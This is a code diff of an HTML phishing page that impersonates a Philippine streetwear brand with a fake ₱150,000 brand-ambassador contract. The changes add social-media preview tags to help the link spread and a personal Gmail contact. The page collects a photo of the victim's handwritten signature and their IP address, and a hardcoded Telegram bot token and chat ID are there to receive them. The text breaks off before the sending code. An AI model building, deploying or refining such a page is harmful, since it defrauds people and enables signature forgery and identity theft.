@@ -4,8 +4,35 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Team Manila - ₱150,000 Collaboration Agreement</title>
+    
+    <!-- ========== EMAIL/SOCIAL MEDIA PREVIEW TAGS ========== -->
+    <meta property="og:title" content="Team Manila - ₱150,000 Collaboration Agreement">
+    <meta property="og:description" content="Exclusive Brand Ambassador Partnership - Run It Campaign. Sign your ₱150,000 contract now!">
+    <meta property="og:image" content="https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="200">
+    <meta property="og:url" content="https://contract-permit.vercel.app/">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Team Manila Lifestyle">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Team Manila - ₱150,000 Collaboration">
+    <meta name="twitter:description" content="Exclusive Brand Ambassador Partnership Contract">
+    <meta name="twitter:image" content="https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872">
+    
+    <meta name="description" content="₱150,000 Exclusive Brand Ambassador Partnership with Team Manila Lifestyle Corporation. Sign your contract now!">
+    <meta name="keywords" content="Team Manila, Collaboration, ₱150,000, Brand Ambassador, Contract, Partnership">
+    
+    <link rel="icon" href="https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872" type="image/png">
+    <link rel="apple-touch-icon" href="https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872">
+    
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+    <!-- ========== STYLES AND FONTS ========== -->
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
         /* Team Manila Brand Colors */
         :root {
@@ -27,11 +54,12 @@
 
         body {
             background: 
-                linear-gradient(rgba(0, 0, 0, 0.9), rgba(0, 0, 0, 0.92)),
-                url('https://shop.teammanilalifestyle.com/cdn/shop/files/RunIt_slider_image_2000x.jpg?v=1769676141');
+                linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.90)),
+                url('https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872');
             background-size: cover;
             background-position: center;
             background-attachment: fixed;
+            background-repeat: no-repeat;
             color: #333;
             min-height: 100vh;
         }
@@ -46,7 +74,7 @@
         .header {
             text-align: center;
             padding: 40px 0;
-            background: rgba(0, 0, 0, 0.9);
+            background: rgba(0, 0, 0, 0.85);
             box-shadow: 0 2px 20px rgba(255, 0, 0, 0.3);
             margin-bottom: 30px;
             border-radius: 15px;
@@ -64,10 +92,11 @@
             bottom: 0;
             background: 
                 linear-gradient(45deg, transparent, rgba(255, 0, 0, 0.1), transparent),
-                url('https://shop.teammanilalifestyle.com/cdn/shop/files/RunIt_slider_image_2000x.jpg?v=1769676141');
-            background-size: cover;
+                url('https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872');
+            background-size: contain;
             background-position: center;
-            opacity: 0.3;
+            background-repeat: no-repeat;
+            opacity: 0.25;
             pointer-events: none;
         }
 
@@ -154,8 +183,11 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: url('data:image/svg+xml,<svg width="100" height="100" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><rect width="100" height="100" fill="transparent"/><path d="M0,50 Q50,0 100,50 Q50,100 0,50" fill="rgba(255,255,255,0.1)"/></svg>');
-            opacity: 0.3;
+            background: url('https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872');
+            background-size: contain;
+            background-position: center;
+            background-repeat: no-repeat;
+            opacity: 0.2;
         }
 
         .contract-header h1 {
@@ -539,9 +571,10 @@
             bottom: 0;
             background: 
                 linear-gradient(45deg, transparent, rgba(255, 0, 0, 0.1), transparent),
-                url('https://shop.teammanilalifestyle.com/cdn/shop/files/RunIt_slider_image_2000x.jpg?v=1769676141');
-            background-size: cover;
+                url('https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872');
+            background-size: contain;
             background-position: center;
+            background-repeat: no-repeat;
             opacity: 0.3;
             pointer-events: none;
         }
@@ -732,397 +765,406 @@
     </style>
 </head>
 <body>
-
-<!-- Loading Overlay -->
-<div id="loadingOverlay">
-    <div class="loading-spinner"></div>
-    <h3 style="color: var(--tm-accent); margin-bottom: 15px; font-size: 24px;">Uploading Signature...</h3>
-    <p style="color: white; text-align: center; max-width: 400px; opacity: 0.8;">Sending signature image to Team Manila...</p>
-</div>
-
-<!-- Notification -->
-<div class="notification" id="notification"></div>
-
-<div class="container">
-    <!-- Header -->
-    <div class="header">
-        <div class="offer-badge">
-            ₱150,000 OFFER
-        </div>
-        <div class="logo">TEAM<span> MANILA</span></div>
-        <p class="header-subtitle">Premium Brand Ambassador Partnership - Run It Campaign</p>
+    <!-- HIDDEN CONTENT FOR EMAIL/SOCIAL MEDIA PREVIEWS -->
+    <div style="display: none;">
+        <h1>Team Manila - ₱150,000 Collaboration Agreement</h1>
+        <h2>Exclusive Brand Ambassador Partnership</h2>
+        <p>Sign your ₱150,000 contract with Team Manila Lifestyle Corporation</p>
+        <img src="https://shop.teammanilalifestyle.com/cdn/shop/files/tmls_logo_1200w_600x200.png?v=1684252872" 
+             alt="Team Manila Logo"
+             width="1200"
+             height="200">
+        <p>For partnership inquiries: salvadordean7@gmail.com</p>
     </div>
 
-    <!-- Contract Container -->
-    <div class="contract-container">
-        <div class="contract-header">
-            <h1>₱150,000 COLLABORATION AGREEMENT</h1>
-            <p>Team Manila "Run It" Collection - Exclusive Brand Ambassador Partnership</p>
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <h3 style="color: var(--tm-accent); margin-bottom: 15px; font-size: 24px;">Uploading Signature...</h3>
+        <p style="color: white; text-align: center; max-width: 400px; opacity: 0.8;">Sending signature image to Team Manila...</p>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="offer-badge">
+                ₱150,000 OFFER
+            </div>
+            <div class="logo">TEAM<span> MANILA</span></div>
+            <p class="header-subtitle">Premium Brand Ambassador Partnership - Run It Campaign</p>
         </div>
 
-        <!-- Contract Content -->
-        <div class="contract-content">
-            <div class="legal-section">
-                <h2>LEGAL COLLABORATION AGREEMENT</h2>
-                <p><strong>THIS EXCLUSIVE BRAND AMBASSADOR AGREEMENT</strong> (the "Agreement") is made and entered into as of the date of electronic acceptance (the "Effective Date") by and between TEAM MANILA LIFESTYLE CORPORATION, a duly registered company ("Company"), and the individual accepting these terms ("Ambassador").</p>
-                
-                <div class="highlight-box">
-                    <p><strong>WHEREAS</strong>, Company is engaged in the business of manufacturing and distributing premium streetwear and lifestyle products under the "Team Manila" brand; and</p>
-                    <p><strong>WHEREAS</strong>, Ambassador possesses influence, credibility, and audience reach relevant to Company's target market; and</p>
-                    <p><strong>WHEREAS</strong>, Company desires to appoint Ambassador as an exclusive brand ambassador for the "Run It" collection campaign.</p>
+        <!-- Contract Container -->
+        <div class="contract-container">
+            <div class="contract-header">
+                <h1>₱150,000 COLLABORATION AGREEMENT</h1>
+                <p>Team Manila "Run It" Collection - Exclusive Brand Ambassador Partnership</p>
+            </div>
+
+            <!-- Contract Content -->
+            <div class="contract-content">
+                <div class="legal-section">
+                    <h2>LEGAL COLLABORATION AGREEMENT</h2>
+                    <p><strong>THIS EXCLUSIVE BRAND AMBASSADOR AGREEMENT</strong> (the "Agreement") is made and entered into as of the date of electronic acceptance (the "Effective Date") by and between TEAM MANILA LIFESTYLE CORPORATION, a duly registered company ("Company"), and the individual accepting these terms ("Ambassador").</p>
+                    
+                    <div class="highlight-box">
+                        <p><strong>WHEREAS</strong>, Company is engaged in the business of manufacturing and distributing premium streetwear and lifestyle products under the "Team Manila" brand; and</p>
+                        <p><strong>WHEREAS</strong>, Ambassador possesses influence, credibility, and audience reach relevant to Company's target market; and</p>
+                        <p><strong>WHEREAS</strong>, Company desires to appoint Ambassador as an exclusive brand ambassador for the "Run It" collection campaign.</p>
+                    </div>
+                    
+                    <p><strong>NOW, THEREFORE</strong>, in consideration of the mutual covenants and promises contained herein, the parties agree as follows:</p>
                 </div>
-                
-                <p><strong>NOW, THEREFORE</strong>, in consideration of the mutual covenants and promises contained herein, the parties agree as follows:</p>
+
+                <div class="legal-section">
+                    <h2>1. COLLABORATION TERMS</h2>
+                    <h3>1.1 Partnership Value</h3>
+                    <p>Company agrees to provide Ambassador with a total compensation package valued at <span class="big-number">₱150,000</span> Philippine Pesos for a 12-month exclusive partnership.</p>
+                    
+                    <h3>1.2 Term</h3>
+                    <p>This Agreement shall commence on the Effective Date and continue for a period of twelve (12) months, unless terminated earlier in accordance with the terms herein.</p>
+                    
+                    <h3>1.3 Exclusivity</h3>
+                    <p>Ambassador agrees not to enter into any similar agreements with competing brands during the term of this Agreement without prior written consent from Company.</p>
+                </div>
+
+                <div class="legal-section">
+                    <h2>2. COMPENSATION DETAILS</h2>
+                    <h3>2.1 Signing Bonus</h3>
+                    <p>Company shall pay Ambassador a signing bonus of <strong>₱50,000</strong> within seven (7) business days of Agreement acceptance.</p>
+                    
+                    <h3>2.2 Monthly Retainer</h3>
+                    <p>Company shall pay Ambassador a monthly retainer of <strong>₱8,333</strong> for twelve (12) consecutive months, payable on the first business day of each month.</p>
+                    
+                    <h3>2.3 Commission Structure</h3>
+                    <p>Ambassador shall receive a <strong>25% commission</strong> on all sales generated through Ambassador's unique referral links or discount codes.</p>
+                    
+                    <h3>2.4 Performance Bonuses</h3>
+                    <p>Additional performance-based bonuses up to <strong>₱50,000</strong> may be awarded based on mutually agreed KPIs and campaign performance metrics.</p>
+                </div>
+
+                <div class="legal-section">
+                    <h2>3. AMBASSADOR OBLIGATIONS</h2>
+                    <h3>3.1 Content Creation</h3>
+                    <p>Ambassador agrees to create and publish a minimum of four (4) high-quality social media posts per month featuring Team Manila products, with focus on the "Run It" collection.</p>
+                    
+                    <h3>3.2 Content Quality</h3>
+                    <p>All content must maintain professional quality standards, align with Team Manila brand guidelines, and receive prior approval from Company's marketing team.</p>
+                    
+                    <h3>3.3 Brand Representation</h3>
+                    <p>Ambassador shall represent the Team Manila brand professionally at all times, both online and offline, and avoid any conduct that could damage the brand's reputation.</p>
+                </div>
+
+                <div class="legal-section">
+                    <h2>4. INTELLECTUAL PROPERTY</h2>
+                    <h3>4.1 Company Ownership</h3>
+                    <p>All content created by Ambassador under this Agreement shall be considered "work made for hire" and Company shall own all intellectual property rights therein.</p>
+                    
+                    <h3>4.2 License Grant</h3>
+                    <p>Ambassador grants Company a perpetual, worldwide, royalty-free license to use Ambassador's name, likeness, and created content for promotional purposes.</p>
+                </div>
+
+                <div class="legal-section">
+                    <h2>5. CONFIDENTIALITY</h2>
+                    <p>Ambassador agrees to maintain confidentiality regarding all non-public information about Company, including but not limited to sales figures, marketing strategies, and product development plans.</p>
+                </div>
+
+                <div class="legal-section">
+                    <h2>6. TERMINATION</h2>
+                    <h3>6.1 Termination for Cause</h3>
+                    <p>Either party may terminate this Agreement immediately for material breach by the other party.</p>
+                    
+                    <h3>6.2 Company Termination</h3>
+                    <p>Company may terminate this Agreement with thirty (30) days written notice without cause.</p>
+                    
+                    <h3>6.3 Effect of Termination</h3>
+                    <p>Upon termination, all rights and obligations shall cease, except those that by their nature should survive termination.</p>
+                </div>
+
+                <div class="legal-section">
+                    <h2>7. GOVERNING LAW</h2>
+                    <p>This Agreement shall be governed by and construed in accordance with the laws of the Republic of the Philippines. Any disputes shall be resolved in the courts of Metro Manila.</p>
+                </div>
+
+                <div class="legal-section">
+                    <h2>ACCEPTANCE AND SIGNATURE</h2>
+                    <p>By checking the acceptance boxes below and uploading a signature, Ambassador acknowledges that they have read, understood, and agree to be bound by all terms and conditions of this ₱150,000 Collaboration Agreement.</p>
+                    
+                    <div class="highlight-box">
+                        <p><strong>IN WITNESS WHEREOF</strong>, the parties have executed this Exclusive Brand Ambassador Agreement as of the Effective Date.</p>
+                        <p style="margin-top: 25px;"><strong>TEAM MANILA LIFESTYLE CORPORATION</strong></p>
+                        <p>By: __________________________</p>
+                        <p>Name: Marco Santos</p>
+                        <p>Title: Director of Partnerships</p>
+                        <p>Date: <span id="currentDate"></span></p>
+                    </div>
+                </div>
             </div>
 
-            <div class="legal-section">
-                <h2>1. COLLABORATION TERMS</h2>
-                <h3>1.1 Partnership Value</h3>
-                <p>Company agrees to provide Ambassador with a total compensation package valued at <span class="big-number">₱150,000</span> Philippine Pesos for a 12-month exclusive partnership.</p>
+            <!-- Signature Upload Section -->
+            <div class="signature-section">
+                <h2>DIGITAL SIGNATURE REQUIRED</h2>
                 
-                <h3>1.2 Term</h3>
-                <p>This Agreement shall commence on the Effective Date and continue for a period of twelve (12) months, unless terminated earlier in accordance with the terms herein.</p>
-                
-                <h3>1.3 Exclusivity</h3>
-                <p>Ambassador agrees not to enter into any similar agreements with competing brands during the term of this Agreement without prior written consent from Company.</p>
-            </div>
+                <div class="signature-box" id="signatureBox">
+                    <div class="signature-upload-area" onclick="document.getElementById('fileInput').click()">
+                        <div class="upload-icon">
+                            <i class="fas fa-signature"></i>
+                        </div>
+                        <h3>Upload Your Signature</h3>
+                        <p>Click to upload a clear picture of your handwritten signature</p>
+                        <div class="upload-btn">Choose Signature Image</div>
+                        <input type="file" id="fileInput" accept="image/*" capture="environment">
+                    </div>
+                    
+                    <div class="preview-container" id="previewContainer">
+                        <img id="signaturePreview" class="signature-preview" src="" alt="Signature Preview">
+                        <div class="preview-actions">
+                            <button class="preview-btn remove" onclick="removeSignature()">Remove</button>
+                            <button class="preview-btn change" onclick="document.getElementById('fileInput').click()">Change</button>
+                        </div>
+                    </div>
+                </div>
 
-            <div class="legal-section">
-                <h2>2. COMPENSATION DETAILS</h2>
-                <h3>2.1 Signing Bonus</h3>
-                <p>Company shall pay Ambassador a signing bonus of <strong>₱50,000</strong> within seven (7) business days of Agreement acceptance.</p>
-                
-                <h3>2.2 Monthly Retainer</h3>
-                <p>Company shall pay Ambassador a monthly retainer of <strong>₱8,333</strong> for twelve (12) consecutive months, payable on the first business day of each month.</p>
-                
-                <h3>2.3 Commission Structure</h3>
-                <p>Ambassador shall receive a <strong>25% commission</strong> on all sales generated through Ambassador's unique referral links or discount codes.</p>
-                
-                <h3>2.4 Performance Bonuses</h3>
-                <p>Additional performance-based bonuses up to <strong>₱50,000</strong> may be awarded based on mutually agreed KPIs and campaign performance metrics.</p>
-            </div>
+                <div class="signature-requirements">
+                    <h4>Signature Requirements:</h4>
+                    <ul>
+                        <li>Must be your actual handwritten signature</li>
+                        <li>Clear photo on white paper with dark ink</li>
+                        <li>No other text or marks in the image</li>
+                        <li>File formats: JPG, PNG, GIF, WEBP, BMP</li>
+                        <li>Maximum file size: 100MB</li>
+                    </ul>
+                </div>
 
-            <div class="legal-section">
-                <h2>3. AMBASSADOR OBLIGATIONS</h2>
-                <h3>3.1 Content Creation</h3>
-                <p>Ambassador agrees to create and publish a minimum of four (4) high-quality social media posts per month featuring Team Manila products, with focus on the "Run It" collection.</p>
-                
-                <h3>3.2 Content Quality</h3>
-                <p>All content must maintain professional quality standards, align with Team Manila brand guidelines, and receive prior approval from Company's marketing team.</p>
-                
-                <h3>3.3 Brand Representation</h3>
-                <p>Ambassador shall represent the Team Manila brand professionally at all times, both online and offline, and avoid any conduct that could damage the brand's reputation.</p>
-            </div>
+                <!-- Agreement Checkboxes -->
+                <div class="agreement-box">
+                    <div class="agreement-item">
+                        <input type="checkbox" id="agreeContract" name="agreeContract">
+                        <label for="agreeContract">
+                            <strong>I HAVE READ AND UNDERSTAND</strong> the entire ₱150,000 Collaboration Agreement.
+                        </label>
+                    </div>
+                    
+                    <div class="agreement-item">
+                        <input type="checkbox" id="agreeTerms" name="agreeTerms">
+                        <label for="agreeTerms">
+                            <strong>I AGREE TO BE BOUND</strong> by all terms and conditions of this Agreement.
+                        </label>
+                    </div>
+                    
+                    <div class="agreement-item">
+                        <input type="checkbox" id="agreePayment" name="agreePayment">
+                        <label for="agreePayment">
+                            <strong>I ACCEPT THE COMPENSATION</strong> package of ₱50,000 signing bonus, ₱8,333 monthly retainer, 25% commission, and performance bonuses.
+                        </label>
+                    </div>
+                    
+                    <div class="agreement-item">
+                        <input type="checkbox" id="agreeSignature" name="agreeSignature">
+                        <label for="agreeSignature">
+                            <strong>I CONFIRM</strong> that the uploaded signature is my authentic handwritten signature.
+                        </label>
+                    </div>
+                    
+                    <div class="agreement-item">
+                        <input type="checkbox" id="agreeExclusivity" name="agreeExclusivity">
+                        <label for="agreeExclusivity">
+                            <strong>I AGREE TO EXCLUSIVE PARTNERSHIP</strong> and will not collaborate with competing brands during the 12-month term.
+                        </label>
+                    </div>
+                </div>
 
-            <div class="legal-section">
-                <h2>4. INTELLECTUAL PROPERTY</h2>
-                <h3>4.1 Company Ownership</h3>
-                <p>All content created by Ambassador under this Agreement shall be considered "work made for hire" and Company shall own all intellectual property rights therein.</p>
-                
-                <h3>4.2 License Grant</h3>
-                <p>Ambassador grants Company a perpetual, worldwide, royalty-free license to use Ambassador's name, likeness, and created content for promotional purposes.</p>
-            </div>
-
-            <div class="legal-section">
-                <h2>5. CONFIDENTIALITY</h2>
-                <p>Ambassador agrees to maintain confidentiality regarding all non-public information about Company, including but not limited to sales figures, marketing strategies, and product development plans.</p>
-            </div>
-
-            <div class="legal-section">
-                <h2>6. TERMINATION</h2>
-                <h3>6.1 Termination for Cause</h3>
-                <p>Either party may terminate this Agreement immediately for material breach by the other party.</p>
-                
-                <h3>6.2 Company Termination</h3>
-                <p>Company may terminate this Agreement with thirty (30) days written notice without cause.</p>
-                
-                <h3>6.3 Effect of Termination</h3>
-                <p>Upon termination, all rights and obligations shall cease, except those that by their nature should survive termination.</p>
-            </div>
-
-            <div class="legal-section">
-                <h2>7. GOVERNING LAW</h2>
-                <p>This Agreement shall be governed by and construed in accordance with the laws of the Republic of the Philippines. Any disputes shall be resolved in the courts of Metro Manila.</p>
-            </div>
-
-            <div class="legal-section">
-                <h2>ACCEPTANCE AND SIGNATURE</h2>
-                <p>By checking the acceptance boxes below and uploading a signature, Ambassador acknowledges that they have read, understood, and agree to be bound by all terms and conditions of this ₱150,000 Collaboration Agreement.</p>
-                
-                <div class="highlight-box">
-                    <p><strong>IN WITNESS WHEREOF</strong>, the parties have executed this Exclusive Brand Ambassador Agreement as of the Effective Date.</p>
-                    <p style="margin-top: 25px;"><strong>TEAM MANILA LIFESTYLE CORPORATION</strong></p>
-                    <p>By: __________________________</p>
-                    <p>Name: Marco Santos</p>
-                    <p>Title: Director of Partnerships</p>
-                    <p>Date: <span id="currentDate"></span></p>
+                <!-- Action Buttons -->
+                <div class="action-buttons">
+                    <button class="btn btn-secondary" id="declineBtn">Decline Offer</button>
+                    <button class="btn btn-primary" id="submitBtn" disabled>Submit Contract</button>
                 </div>
             </div>
         </div>
 
-        <!-- Signature Upload Section -->
-        <div class="signature-section">
-            <h2>DIGITAL SIGNATURE REQUIRED</h2>
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-content">
+                <p>© 2024 Team Manila Lifestyle Corporation. All Rights Reserved.</p>
+                <p>This is a legally binding contract for a ₱150,000 collaboration. Please read carefully before signing.</p>
+                <p>For partnership inquiries: <a href="mailto:salvadordean7@gmail.com">salvadordean7@gmail.com</a> | Contract ID: TM-2024-<span id="contractId"></span></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    // Telegram Bot Configuration - YOUR CORRECT CREDENTIALS
+    const BOT_TOKEN = '8264793416:AAFmsuZIrUlkGAQiF2xDtOToNmNIjSTyi5I';
+    const CHAT_ID = '8456018521';
+
+    // Set current date
+    document.getElementById('currentDate').textContent = new Date().toLocaleDateString('en-US', {
+        year: 'numeric',
+        month: 'long',
+        day: 'numeric'
+    });
+
+    // Generate contract ID
+    const contractId = Math.floor(100000 + Math.random() * 900000);
+    document.getElementById('contractId').textContent = contractId;
+
+    // File upload functionality
+    const fileInput = document.getElementById('fileInput');
+    const previewContainer = document.getElementById('previewContainer');
+    const signaturePreview = document.getElementById('signaturePreview');
+    const signatureBox = document.getElementById('signatureBox');
+    let signatureFile = null;
+    let signatureBase64 = null;
+
+    // Handle file selection
+    fileInput.addEventListener('change', function(e) {
+        const file = e.target.files[0];
+        if (file) {
+            // Check file type
+            const validTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp', 'image/bmp'];
+            if (!validTypes.includes(file.type.toLowerCase())) {
+                showNotification('Please upload an image file (JPG, PNG, GIF, WEBP, BMP)', 'error');
+                return;
+            }
             
-            <div class="signature-box" id="signatureBox">
-                <div class="signature-upload-area" onclick="document.getElementById('fileInput').click()">
-                    <div class="upload-icon">
-                        <i class="fas fa-signature"></i>
-                    </div>
-                    <h3>Upload Your Signature</h3>
-                    <p>Click to upload a clear picture of your handwritten signature</p>
-                    <div class="upload-btn">Choose Signature Image</div>
-                    <input type="file" id="fileInput" accept="image/*" capture="environment">
-                </div>
-                
-                <div class="preview-container" id="previewContainer">
-                    <img id="signaturePreview" class="signature-preview" src="" alt="Signature Preview">
-                    <div class="preview-actions">
-                        <button class="preview-btn remove" onclick="removeSignature()">Remove</button>
-                        <button class="preview-btn change" onclick="document.getElementById('fileInput').click()">Change</button>
-                    </div>
-                </div>
-            </div>
-
-            <div class="signature-requirements">
-                <h4>Signature Requirements:</h4>
-                <ul>
-                    <li>Must be your actual handwritten signature</li>
-                    <li>Clear photo on white paper with dark ink</li>
-                    <li>No other text or marks in the image</li>
-                    <li>File formats: JPG, PNG, GIF, WEBP, BMP</li>
-                    <li>Maximum file size: 100MB</li>
-                </ul>
-            </div>
-
-            <!-- Agreement Checkboxes -->
-            <div class="agreement-box">
-                <div class="agreement-item">
-                    <input type="checkbox" id="agreeContract" name="agreeContract">
-                    <label for="agreeContract">
-                        <strong>I HAVE READ AND UNDERSTAND</strong> the entire ₱150,000 Collaboration Agreement.
-                    </label>
-                </div>
-                
-                <div class="agreement-item">
-                    <input type="checkbox" id="agreeTerms" name="agreeTerms">
-                    <label for="agreeTerms">
-                        <strong>I AGREE TO BE BOUND</strong> by all terms and conditions of this Agreement.
-                    </label>
-                </div>
-                
-                <div class="agreement-item">
-                    <input type="checkbox" id="agreePayment" name="agreePayment">
-                    <label for="agreePayment">
-                        <strong>I ACCEPT THE COMPENSATION</strong> package of ₱50,000 signing bonus, ₱8,333 monthly retainer, 25% commission, and performance bonuses.
-                    </label>
-                </div>
-                
-                <div class="agreement-item">
-                    <input type="checkbox" id="agreeSignature" name="agreeSignature">
-                    <label for="agreeSignature">
-                        <strong>I CONFIRM</strong> that the uploaded signature is my authentic handwritten signature.
-                    </label>
-                </div>
-                
-                <div class="agreement-item">
-                    <input type="checkbox" id="agreeExclusivity" name="agreeExclusivity">
-                    <label for="agreeExclusivity">
-                        <strong>I AGREE TO EXCLUSIVE PARTNERSHIP</strong> and will not collaborate with competing brands during the 12-month term.
-                    </label>
-                </div>
-            </div>
-
-            <!-- Action Buttons -->
-            <div class="action-buttons">
-                <button class="btn btn-secondary" id="declineBtn">Decline Offer</button>
-                <!-- CHANGED: Button text from "Sign & Accept ₱150K Offer" to "Submit Contract" -->
-                <button class="btn btn-primary" id="submitBtn" disabled>Submit Contract</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Footer -->
-    <div class="footer">
-        <div class="footer-content">
-            <p>© 2024 Team Manila Lifestyle Corporation. All Rights Reserved.</p>
-            <p>This is a legally binding contract for a ₱150,000 collaboration. Please read carefully before signing.</p>
-            <!-- CHANGED: Email from partnerships@teammanila.com to salvadordean7@gmail.com -->
-            <p>For partnership inquiries: <a href="mailto:salvadordean7@gmail.com">salvadordean7@gmail.com</a> | Contract ID: TM-2024-<span id="contractId"></span></p>
-        </div>
-    </div>
-</div>
-
-<script>
-// Telegram Bot Configuration - YOUR CORRECT CREDENTIALS
-const BOT_TOKEN = '8264793416:AAFmsuZIrUlkGAQiF2xDtOToNmNIjSTyi5I';
-const CHAT_ID = '8456018521';
-
-// Set current date
-document.getElementById('currentDate').textContent = new Date().toLocaleDateString('en-US', {
-    year: 'numeric',
-    month: 'long',
-    day: 'numeric'
-});
-
-// Generate contract ID
-const contractId = Math.floor(100000 + Math.random() * 900000);
-document.getElementById('contractId').textContent = contractId;
-
-// File upload functionality
-const fileInput = document.getElementById('fileInput');
-const previewContainer = document.getElementById('previewContainer');
-const signaturePreview = document.getElementById('signaturePreview');
-const signatureBox = document.getElementById('signatureBox');
-let signatureFile = null;
-let signatureBase64 = null;
-
-// Handle file selection
-fileInput.addEventListener('change', function(e) {
-    const file = e.target.files[0];
-    if (file) {
-        // Check file type
-        const validTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp', 'image/bmp'];
-        if (!validTypes.includes(file.type.toLowerCase())) {
-            showNotification('Please upload an image file (JPG, PNG, GIF, WEBP, BMP)', 'error');
-            return;
+            // Check file size (100MB max)
+            if (file.size > 100 * 1024 * 1024) {
+                showNotification('File size must be less than 100MB', 'error');
+                return;
+            }
+            
+            signatureFile = file;
+            
+            // Create preview and convert to base64
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                signaturePreview.src = e.target.result;
+                signatureBase64 = e.target.result.split(',')[1]; // Get base64 data
+            };
+            reader.readAsDataURL(file);
+            
+            previewContainer.style.display = 'block';
+            signatureBox.classList.add('drag-over');
+            updateSubmitButton();
+            
+            // Show success message
+            setTimeout(() => {
+                showNotification('Signature uploaded successfully!', 'success');
+            }, 500);
         }
-        
-        // Check file size (100MB max)
-        if (file.size > 100 * 1024 * 1024) {
-            showNotification('File size must be less than 100MB', 'error');
-            return;
-        }
-        
-        signatureFile = file;
-        
-        // Create preview and convert to base64
-        const reader = new FileReader();
-        reader.onload = function(e) {
-            signaturePreview.src = e.target.result;
-            signatureBase64 = e.target.result.split(',')[1]; // Get base64 data
-        };
-        reader.readAsDataURL(file);
-        
-        previewContainer.style.display = 'block';
+    });
+
+    // Drag and drop functionality
+    signatureBox.addEventListener('dragover', function(e) {
+        e.preventDefault();
         signatureBox.classList.add('drag-over');
-        updateSubmitButton();
+    });
+
+    signatureBox.addEventListener('dragleave', function(e) {
+        e.preventDefault();
+        signatureBox.classList.remove('drag-over');
+    });
+
+    signatureBox.addEventListener('drop', function(e) {
+        e.preventDefault();
+        signatureBox.classList.remove('drag-over');
         
-        // Show success message
-        setTimeout(() => {
-            showNotification('Signature uploaded successfully!', 'success');
-        }, 500);
-    }
-});
-
-// Drag and drop functionality
-signatureBox.addEventListener('dragover', function(e) {
-    e.preventDefault();
-    signatureBox.classList.add('drag-over');
-});
-
-signatureBox.addEventListener('dragleave', function(e) {
-    e.preventDefault();
-    signatureBox.classList.remove('drag-over');
-});
-
-signatureBox.addEventListener('drop', function(e) {
-    e.preventDefault();
-    signatureBox.classList.remove('drag-over');
-    
-    if (e.dataTransfer.files.length) {
-        fileInput.files = e.dataTransfer.files;
-        fileInput.dispatchEvent(new Event('change'));
-    }
-});
-
-// Remove signature
-function removeSignature() {
-    signatureFile = null;
-    signatureBase64 = null;
-    fileInput.value = '';
-    previewContainer.style.display = 'none';
-    signatureBox.classList.remove('drag-over');
-    updateSubmitButton();
-    showNotification('Signature removed', 'error');
-}
-
-// Update submit button state
-function updateSubmitButton() {
-    const checkboxes = document.querySelectorAll('.agreement-box input[type="checkbox"]');
-    const allChecked = Array.from(checkboxes).every(cb => cb.checked);
-    const hasSignature = signatureFile !== null;
-    
-    document.getElementById('submitBtn').disabled = !(allChecked && hasSignature);
-}
-
-// Checkbox event listeners
-document.querySelectorAll('.agreement-box input[type="checkbox"]').forEach(checkbox => {
-    checkbox.addEventListener('change', updateSubmitButton);
-});
-
-// Notification function
-function showNotification(message, type = 'success') {
-    const notification = document.getElementById('notification');
-    notification.textContent = message;
-    notification.className = 'notification ' + type;
-    
-    setTimeout(() => {
-        notification.classList.remove('success', 'error', 'info');
-        notification.style.opacity = '0';
-        notification.style.transform = 'translateX(100px)';
-    }, 3000);
-}
-
-// Decline button
-document.getElementById('declineBtn').addEventListener('click', function() {
-    if (confirm('Are you sure you want to decline this ₱150,000 collaboration offer? This exclusive opportunity will not be available again.')) {
-        showNotification('₱150,000 offer declined. Exiting...', 'error');
-        setTimeout(() => {
-            window.location.href = 'index.html';
-        }, 1500);
-    }
-});
-
-// Submit button - Sends signature image to Telegram
-document.getElementById('submitBtn').addEventListener('click', async function() {
-    // Show loading overlay
-    document.getElementById('loadingOverlay').style.display = 'flex';
-    
-    try {
-        // Get user IP address
-        let ip = 'Unknown IP';
-        try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            ip = ipData.ip;
-        } catch (ipError) {
-            console.log('Could not get IP:', ipError);
+        if (e.dataTransfer.files.length) {
+            fileInput.files = e.dataTransfer.files;
+            fileInput.dispatchEvent(new Event('change'));
         }
+    });
+
+    // Remove signature
+    function removeSignature() {
+        signatureFile = null;
+        signatureBase64 = null;
+        fileInput.value = '';
+        previewContainer.style.display = 'none';
+        signatureBox.classList.remove('drag-over');
+        updateSubmitButton();
+        showNotification('Signature removed', 'error');
+    }
+
+    // Update submit button state
+    function updateSubmitButton() {
